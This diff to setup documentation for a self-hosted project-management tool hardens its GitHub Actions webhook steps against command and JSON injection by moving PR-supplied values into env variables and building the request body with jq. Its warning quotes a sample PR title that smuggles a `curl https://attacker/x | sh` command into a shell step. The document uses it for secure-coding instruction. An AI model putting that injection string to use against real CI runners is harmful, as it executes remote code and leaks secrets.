@@ -98,23 +98,80 @@ Pick one:
   `http://<office-pc-tailscale-name>:3000`.
 
 Either way, add a repository secret named `PM_TOKEN` with the same value
-as the server's `.env` `PM_TOKEN`. Example workflow step for a PR event:
+as the server's `.env` `PM_TOKEN`.
+
+**Do not put `${{ github.event.pull_request.title }}`, a branch name, or any
+other value that a PR author controls directly into a `run:` shell string.**
+GitHub substitutes `${{ ... }}` expressions into the script's TEXT before
+bash ever parses it, so a PR titled `"; curl https://attacker/x | sh; echo "`
+would execute on the runner, and if it runs on a self-hosted runner (1.5
+option 1) that is a persistent machine on the office network, not a
+throwaway VM. It would also run on the same command line as `PM_TOKEN`, so
+the token would leak with it. Put every untrusted value in an `env:` block,
+reference it as a shell variable, and build the JSON body with `jq` instead
+of hand-assembled `\"` escapes, hand-built JSON has the same problem one
+level down: a double quote in a title breaks the body, and a crafted title
+can inject a sibling key such as `"environment":"production"`.
+
+PR opened:
 
 ```yaml
 - name: Notify OfficePM
+  env:
+    PR_TITLE: ${{ github.event.pull_request.title }}
+    HEAD_REF: ${{ github.head_ref }}
+    PR_URL: ${{ github.event.pull_request.html_url }}
+    PM_TOKEN: ${{ secrets.PM_TOKEN }}
   run: |
-    curl -sf -X POST http://pm-office:3000/api/github/pr-opened \
-      -H "x-pm-token: ${{ secrets.PM_TOKEN }}" \
-      -H "Content-Type: application/json" \
-      -d "{\"repo\":\"${{ github.repository }}\",\"branch\":\"${{ github.head_ref }}\",\"title\":\"${{ github.event.pull_request.title }}\",\"url\":\"${{ github.event.pull_request.html_url }}\",\"actor\":\"${{ github.actor }}\"}"
+    jq -n --arg repo "$GITHUB_REPOSITORY" --arg branch "$HEAD_REF" \
+          --arg title "$PR_TITLE" --arg url "$PR_URL" \
+          --arg actor "$GITHUB_ACTOR" \
+          '{repo:$repo,branch:$branch,title:$title,url:$url,actor:$actor}' \
+    | curl -sf -X POST http://pm-office:3000/api/github/pr-opened \
+        -H "x-pm-token: $PM_TOKEN" -H "Content-Type: application/json" --data @-
 ```
 
-Do the same shape for `deploy` (send `environment: staging|production`)
-and `release` (send `tag` and `changelog`) on the matching workflow
-triggers. A webhook only moves a ticket if its board has `has_github: true`
-in `projects.json` - Design, Marketing and Support boards in the seed data
-are deliberately not wired up, and will just return
-`{"ok": true, "matched": []}`.
+Deploy:
+
+```yaml
+- name: Notify OfficePM of deploy
+  env:
+    COMMIT_MSG: ${{ github.event.head_commit.message }}
+    PM_TOKEN: ${{ secrets.PM_TOKEN }}
+  run: |
+    jq -n --arg repo "$GITHUB_REPOSITORY" --arg ref "$GITHUB_REF_NAME" \
+          --arg msg "$COMMIT_MSG" --arg env "production" \
+          --arg actor "$GITHUB_ACTOR" \
+          '{repo:$repo,ref:$ref,commit_message:$msg,environment:$env,actor:$actor}' \
+    | curl -sf -X POST http://pm-office:3000/api/github/deploy \
+        -H "x-pm-token: $PM_TOKEN" -H "Content-Type: application/json" --data @-
+```
+
+Set `--arg env "staging"` on the workflow that deploys to staging.
+`environment` is a fixed literal you write into the workflow yourself here,
+never a value taken from PR/commit content, that is what keeps a crafted
+title from being able to forge a production deploy event.
+
+Release:
+
+```yaml
+- name: Notify OfficePM of release
+  env:
+    RELEASE_NOTES: ${{ github.event.release.body }}
+    RELEASE_URL: ${{ github.event.release.html_url }}
+    PM_TOKEN: ${{ secrets.PM_TOKEN }}
+  run: |
+    jq -n --arg repo "$GITHUB_REPOSITORY" --arg tag "$GITHUB_REF_NAME" \
+          --arg changelog "$RELEASE_NOTES" --arg url "$RELEASE_URL" \
+          --arg actor "$GITHUB_ACTOR" \
+          '{repo:$repo,tag:$tag,changelog:$changelog,url:$url,actor:$actor}' \
+    | curl -sf -X POST http://pm-office:3000/api/github/release \
+        -H "x-pm-token: $PM_TOKEN" -H "Content-Type: application/json" --data @-
+```
+
+A webhook only moves a ticket if its board has `has_github: true` in
+`projects.json` - Design, Marketing and Support boards in the seed data are
+deliberately not wired up, and will just return `{"ok": true, "matched": []}`.
 
 ### 1.6 Backups
 
